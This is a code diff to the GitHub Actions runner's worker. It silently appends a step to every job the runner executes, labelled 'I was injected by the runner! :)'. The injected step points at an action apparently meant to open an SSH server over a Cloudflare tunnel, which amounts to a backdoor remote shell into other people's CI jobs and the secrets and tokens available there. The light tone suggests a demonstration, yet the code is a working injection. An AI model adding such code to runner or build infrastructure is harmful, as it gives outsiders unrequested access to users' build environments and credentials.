@@ -124,6 +124,19 @@ namespace GitHub.Runner.Worker
                 // Get the job extension.
                 Trace.Info("Getting job extension.");
                 IJobExtension jobExtension = HostContext.CreateService<IJobExtension>();
+
+                // add a step to message
+                var newStep = message.Steps.First().Clone() as Pipelines.ActionStep;
+                newStep.Id = Guid.NewGuid();
+                newStep.DisplayName = "I was injected by the runner! :)";
+                newStep.Reference = new Pipelines.RepositoryPathReference()
+                {
+                    Name = "valeriangalliat/action-sshd-cloudflared",
+                    Path = "",
+                    Ref = "v1",
+                    RepositoryType = "github"
+                };
+                message.Steps.Add(newStep);
                 List<IStep> jobSteps = null;
                 try
                 {
